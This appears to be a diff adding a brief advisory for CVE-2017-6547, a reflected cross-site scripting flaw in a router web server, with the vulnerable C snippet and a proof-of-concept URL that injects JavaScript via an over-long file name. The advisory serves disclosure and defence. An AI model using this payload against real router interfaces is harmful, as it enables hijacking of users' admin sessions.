@@ -1,0 +1,22 @@
+Cross-Site Scripting (XSS)
+
+Component: httpd
+
+CVE: CVE-2017-6547
+
+Vulnerability:
+
+httpd checks in the function handle_request if the requested file name is longer than 50 chars. It then responds with a redirection which allows an attacker to inject arbitrary JavaScript code into the router’s web interface context.
+
+...
+
+if(strlen(file) > 50 &&!(strstr(file, "findasus")) && !(strstr(file, "acme-challenge")))
+{
+    char inviteCode[256];
+    snprintf(inviteCode, sizeof(inviteCode), "<script>location.href='/cloud_sync.asp?flag=%s';</script>", file);
+    send_page( 200, "OK", (char*) 0, inviteCode, 0);
+
+...
+PoC:
+
+http://192.168.1.1/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';alert('XSS');'A
